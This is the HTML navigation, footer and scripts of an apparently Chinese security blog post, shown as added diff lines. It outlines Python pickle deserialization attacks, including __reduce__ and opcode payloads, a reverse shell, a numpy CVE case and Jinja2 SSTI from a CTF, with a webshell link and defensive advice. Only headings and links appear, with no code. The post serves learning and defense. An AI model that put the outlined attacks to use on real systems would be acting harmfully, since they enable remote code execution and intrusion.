href="#我们先不要管这里面的-p0-p1-p2-我上面说过了，这个东西是一个标签，有了它只是会出现一个存入内存的操作，p-后面的数字是-key-，因此对最后命令的执行没有任何影响"><span class="nav-number">1.13.3.</span> <span class="nav-text">我们先不要管这里面的 p0 p1 p2 ,我上面说过了，这个东西是一个标签，有了它只是会出现一个存入内存的操作，p 后面的数字是 key ，因此对最后命令的执行没有任何影响</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#为了比较方便，我再把上面的那段代码拿下来"><span class="nav-number">1.13.4.</span> <span class="nav-text">为了比较方便，我再把上面的那段代码拿下来</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#PVM-的-操作码-R-就是-reduce-的返回值的一个底层实现。"><span class="nav-number">1.13.5.</span> <span class="nav-text">PVM 的 操作码 R 就是 __reduce__ 的返回值的一个底层实现。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#紧接着我们让上面的结果进行反序列化一下："><span class="nav-number">1.14.</span> <span class="nav-text">紧接着我们让上面的结果进行反序列化一下：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#示例代码：-2"><span class="nav-number">1.14.1.</span> <span class="nav-text">示例代码：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#那这样就非常的方便了，我们能利用这个-reduce-轻松构造我们想要执行的命令，甚至是执行代码（我们可以将-字符串部分换成-python-c-“我们要执行的代码”）"><span class="nav-number">1.14.2.</span> <span class="nav-text">那这样就非常的方便了，我们能利用这个 reduce 轻松构造我们想要执行的命令，甚至是执行代码（我们可以将 字符串部分换成 python -c “我们要执行的代码”）</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#我们尝试执行代码反弹-shell"><span class="nav-number">1.15.</span> <span class="nav-text">我们尝试执行代码反弹 shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#示例代码"><span class="nav-number">1.16.</span> <span class="nav-text">示例代码</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#我们成功运行我们的代码，成功反弹shell。"><span class="nav-number">1.17.</span> <span class="nav-text">我们成功运行我们的代码，成功反弹shell。</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这里就不给出运行结果了。"><span class="nav-number">1.17.1.</span> <span class="nav-text">这里就不给出运行结果了。</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#补充："><span class="nav-number">1.18.</span> <span class="nav-text">补充：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#又发现了一个比较好的命令能执行-系统命令，那就是-python-pty-模块"><span class="nav-number">1.18.1.</span> <span class="nav-text">又发现了一个比较好的命令能执行 系统命令，那就是 python pty 模块</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-问题出现"><span class="nav-number">1.19.</span> <span class="nav-text">3.问题出现</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们发现如果我们单纯地使用-c-参数执行代码的话，好像对一些简单的代码还行，但是如果出现了一些自定义函数了，那么在格式上就比较麻烦，那么有没有一种方式可以满足我们真正执行我们想执行的任何代码的目的呢？"><span class="nav-number">1.19.1.</span> <span class="nav-text">我们发现如果我们单纯地使用 -c 参数执行代码的话，好像对一些简单的代码还行，但是如果出现了一些自定义函数了，那么在格式上就比较麻烦，那么有没有一种方式可以满足我们真正执行我们想执行的任何代码的目的呢？</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#咦？你上面不是说-pickle-不能序列化代码对象吗？-没错，pickle-的确不可以，不信我们试一试"><span class="nav-number">1.19.2.</span> <span class="nav-text">咦？你上面不是说 pickle 不能序列化代码对象吗？ 没错，pickle 的确不可以，不信我们试一试</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo"><span class="nav-number">1.19.3.</span> <span class="nav-text">由于python可以在函数当中再导入模块和定义函数，所以我们可以将自己要执行的代码都写到一个函数里foo()</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#示例代码：-3"><span class="nav-number">1.20.</span> <span class="nav-text">示例代码：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#运行结果如下："><span class="nav-number">1.20.1.</span> <span class="nav-text">运行结果如下：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-问题解决"><span class="nav-number">1.21.</span> <span class="nav-text">4.问题解决</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#但是，我们还有一个利器，自从-python-2-6-起，Python-给我们提供了一个可以序列化code对象的模块–Marshal"><span class="nav-number">1.21.1.</span> <span class="nav-text">但是，我们还有一个利器，自从 python 2.6 起，Python 给我们提供了一个可以序列化code对象的模块–Marshal</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#我们可以这样让这段代码序列化，同时为了显示方便，我们选择序列化后再进行-base64-处理"><span class="nav-number">1.21.2.</span> <span class="nav-text">我们可以这样让这段代码序列化，同时为了显示方便，我们选择序列化后再进行 base64 处理</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#示例代码：-4"><span class="nav-number">1.22.</span> <span class="nav-text">示例代码：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#运行结果如下：-1"><span class="nav-number">1.23.</span> <span class="nav-text">运行结果如下：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用-reduce-呢？好像不行，因为-reduce-是利用调用某个-callable-并传递参数来执行的，而我们这个函数本身就是一个-callable-，我们需要执行它，而不是将他作为某个函数的参数，那这个时候怎么办？这时候就要利用我们上面分析的那个-PVM-操作码来自己构造了"><span class="nav-number">1.23.0.1.</span> <span class="nav-text">好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 __reduce__呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，那这个时候怎么办？这时候就要利用我们上面分析的那个 PVM 操作码来自己构造了</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们先写出来我们需要执行的东西，实际上这里也用到了-Python-的一个面向对象的特性，Python-能通过-types-FunctionTyle-func-code-globals-’’-来动态地创建匿名函数，这一部分的内容可以看官方文档的介绍"><span class="nav-number">1.23.0.2.</span> <span class="nav-text">我们先写出来我们需要执行的东西，实际上这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数，这一部分的内容可以看官方文档的介绍</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结合我们之前的编码操作，我们最重要执行的是"><span class="nav-number">1.23.0.3.</span> <span class="nav-text">结合我们之前的编码操作，我们最重要执行的是</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#那我们现在的任务就是如何通过-PVM-操作码来构造出这个东西的执行-其实还是蛮复杂的"><span class="nav-number">1.23.1.</span> <span class="nav-text">那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行(其实还是蛮复杂的)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#这是我们直接给出的paylaod"><span class="nav-number">1.23.2.</span> <span class="nav-text">这是我们直接给出的paylaod:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#大家有兴趣可以自己根据我之前的分析来看自己也分析一下这段代码，会对你的能力有所提升，那么为了每次构造这段代码的方便性，外国大牛给出了构造-payload-的模板，"><span class="nav-number">1.23.3.</span> <span class="nav-text">大家有兴趣可以自己根据我之前的分析来看自己也分析一下这段代码，会对你的能力有所提升，那么为了每次构造这段代码的方便性，外国大牛给出了构造 payload 的模板，</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#payload模板"><span class="nav-number">1.24.</span> <span class="nav-text">payload模板</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#结果："><span class="nav-number">1.25.</span> <span class="nav-text">结果：</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们看一下最终执行这段字符串的结果"><span class="nav-number">1.25.1.</span> <span class="nav-text">我们看一下最终执行这段字符串的结果</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#不仅返回了我们-feibonaqie-数列的结果，还返回了我们的-shell"><span class="nav-number">1.25.2.</span> <span class="nav-text">不仅返回了我们 feibonaqie 数列的结果，还返回了我们的 shell</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x08-numpy反序列化-cve-2019-6446"><span class="nav-number">1.26.</span> <span class="nav-text">0x08 numpy反序列化(cve-2019-6446)</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#我们可以全局搜到哪里调用了numpy："><span class="nav-number">1.26.1.</span> <span class="nav-text">我们可以全局搜到哪里调用了numpy：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因为numpy的loads方法调用的也是pickle-因此pickle的payload还是可以用"><span class="nav-number">1.26.2.</span> <span class="nav-text">因为numpy的loads方法调用的也是pickle,因此pickle的payload还是可以用.</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#payload-post提交："><span class="nav-number">1.26.3.</span> <span class="nav-text">payload:post提交：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#同样会报错-但是能成功反弹shell"><span class="nav-number">1.26.4.</span> <span class="nav-text">同样会报错,但是能成功反弹shell.</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x09-Jinja2-from-string-SSTI"><span class="nav-number">1.27.</span> <span class="nav-text">0x09 Jinja2.from_string SSTI</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#这个也是今年的新漏洞"><span class="nav-number">1.27.1.</span> <span class="nav-text">这个也是今年的新漏洞</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-www-exploit-db-com-exploits-46386"><span class="nav-number">1.27.2.</span> <span class="nav-text">https://www.exploit-db.com/exploits/46386</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在data处使用了Jinja2-from-string直接拼接字符串-存在ssti。"><span class="nav-number">1.27.3.</span> <span class="nav-text">在data处使用了Jinja2.from_string直接拼接字符串,存在ssti。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#poc需要base64编码填入在cookie的username字段，还有因为是python3有些payload不能使用。"><span class="nav-number">1.27.4.</span> <span class="nav-text">poc需要base64编码填入在cookie的username字段，还有因为是python3有些payload不能使用。</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#读flag"><span class="nav-number">1.27.5.</span> <span class="nav-text">读flag:</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#执行命令："><span class="nav-number">1.27.6.</span> <span class="nav-text">执行命令：</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#flask日志记录"><span class="nav-number">1.28.</span> <span class="nav-text">flask日志记录</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#flask本身的日志功能并不能满足需求，因此写了一个："><span class="nav-number">1.28.1.</span> <span class="nav-text">flask本身的日志功能并不能满足需求，因此写了一个：</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#因为python这题check比较严格-上了waf一直被checkdown-所以没写waf-不过和php的道理是一样的"><span class="nav-number">1.28.2.</span> <span class="nav-text">因为python这题check比较严格,上了waf一直被checkdown,所以没写waf.不过和php的道理是一样的.</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#python-webshell"><span class="nav-number">1.28.2.1.</span> <span class="nav-text">python webshell</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#比赛中虽然没用上-可以准备着-万一哪次就用到了"><span class="nav-number">1.28.2.2.</span> <span class="nav-text">比赛中虽然没用上,可以准备着,万一哪次就用到了.</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-github-com-evilcos-python-webshell-blob-master-webllehs-py"><span class="nav-number">1.28.3.</span> <span class="nav-text">https://github.com/evilcos/python-webshell/blob/master/webllehs.py</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#小结"><span class="nav-number">1.29.</span> <span class="nav-text">小结</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#java题-writeup-一叶飘零师傅写的2019-OGeek-Final-amp-Java-Web"><span class="nav-number">1.29.0.1.</span> <span class="nav-text">java题 writeup : 一叶飘零师傅写的2019 OGeek Final &amp; Java Web</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#php题writeup-xmsec师傅写的ogeek-ozero-wp"><span class="nav-number">1.29.0.2.</span> <span class="nav-text">php题writeup: xmsec师傅写的ogeek-ozero-wp</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#上面这部分内容如果想看详细的解释，可以参考-文章一-和-文章二"><span class="nav-number">1.29.1.</span> <span class="nav-text">上面这部分内容如果想看详细的解释，可以参考 文章一 和 文章二</span></a></li></ol><li class="nav-item nav-level-4"><a class="nav-link" href="#0x08-Python-反序列化漏洞如何防御"><span class="nav-number">1.30.</span> <span class="nav-text">0x08 Python 反序列化漏洞如何防御</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-不要再不守信任的通道中传递-pcikle-序列化对象"><span class="nav-number">1.30.1.</span> <span class="nav-text">(1) 不要再不守信任的通道中传递 pcikle 序列化对象</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-在传递序列化对象前请进行签名或者加密，防止篡改和重播"><span class="nav-number">1.30.2.</span> <span class="nav-text">(2) 在传递序列化对象前请进行签名或者加密，防止篡改和重播</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#3-如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据"><span class="nav-number">1.30.3.</span> <span class="nav-text">(3) 如果序列化数据存储在磁盘上，请确保不受信任的第三方不能修改、覆盖或者重新创建自己的序列化数据</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#4-将-pickle-加载的数据列入白名单"><span class="nav-number">1.30.4.</span> <span class="nav-text">(4) 将 pickle 加载的数据列入白名单</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0X09-参考"><span class="nav-number">1.31.</span> <span class="nav-text">0X09 参考</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#https-checkoway-net-musings-pickle"><span class="nav-number">1.31.1.</span> <span class="nav-text">https://checkoway.net/musings/pickle/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-bendawang-site-2018-03-01-E5-85-B3-E4-BA-8EPython-sec-E7-9A-84-E4-B8-80-E4-BA-9B-E6-80-BB-E7-BB-93"><span class="nav-number">1.31.2.</span> <span class="nav-text">http://bendawang.site/2018/03/01/%E5%85%B3%E4%BA%8EPython-sec%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%BB%E7%BB%93/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-www-bendawang-site-2017-03-21-python-E6-B7-B1-E5-85-A5-E5-AD-A6-E4-B9-A0-E4-B8-80-EF-BC-9A-E7-B1-BB-E4-B8-8E-E5-85-83-E7-B1-BB-EF-BC-88metaclass-EF-BC-89-E7-9A-84-E7-90-86-E8-A7-A3"><span class="nav-number">1.31.3.</span> <span class="nav-text">http://www.bendawang.site/2017/03/21/python%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0-%E4%B8%80-%EF%BC%9A%E7%B1%BB%E4%B8%8E%E5%85%83%E7%B1%BB%EF%BC%88metaclass%EF%BC%89%E7%9A%84%E7%90%86%E8%A7%A3/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-www-polaris-lab-com-index-php-archives-178"><span class="nav-number">1.31.4.</span> <span class="nav-text">http://www.polaris-lab.com/index.php/archives/178/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-xz-aliyun-com-t-2289"><span class="nav-number">1.31.5.</span> <span class="nav-text">https://xz.aliyun.com/t/2289</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-blog-csdn-net-yanghuan313-article-details-65010925"><span class="nav-number">1.31.6.</span> <span class="nav-text">https://blog.csdn.net/yanghuan313/article/details/65010925</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-www-cnblogs-com-wfzWebSecuity-p-9401677-html"><span class="nav-number">1.31.7.</span> <span class="nav-text">https://www.cnblogs.com/wfzWebSecuity/p/9401677.html</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#http-blog-knownsec-com-2015-12-sqlmap-code-execution-vulnerability-analysis"><span class="nav-number">1.31.8.</span> <span class="nav-text">http://blog.knownsec.com/2015/12/sqlmap-code-execution-vulnerability-analysis/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-media-blackhat-com-bh-us-11-Slaviero-BH-US-11-Slaviero-Sour-Pickles-Slides-pdf"><span class="nav-number">1.31.9.</span> <span class="nav-text">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-media-blackhat-com-bh-us-11-Slaviero-BH-US-11-Slaviero-Sour-Pickles-WP-pdf"><span class="nav-number">1.31.10.</span> <span class="nav-text">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-blog-csdn-net-sinat-29552923-article-details-70833455"><span class="nav-number">1.31.11.</span> <span class="nav-text">https://blog.csdn.net/sinat_29552923/article/details/70833455</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-blog-nelhage-com-2011-03-exploiting-pickle"><span class="nav-number">1.31.12.</span> <span class="nav-text">https://blog.nelhage.com/2011/03/exploiting-pickle/</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-segmentfault-com-a-1190000013099825"><span class="nav-number">1.31.13.</span> <span class="nav-text">https://segmentfault.com/a/1190000013099825</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#https-segmentfault-com-a-1190000013214956"><span class="nav-number">1.31.14.</span> <span class="nav-text">https://segmentfault.com/a/1190000013214956</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#web安全-漏洞分析"><span class="nav-number">1.31.15.</span> <span class="nav-text">web安全 漏洞分析</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">33k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
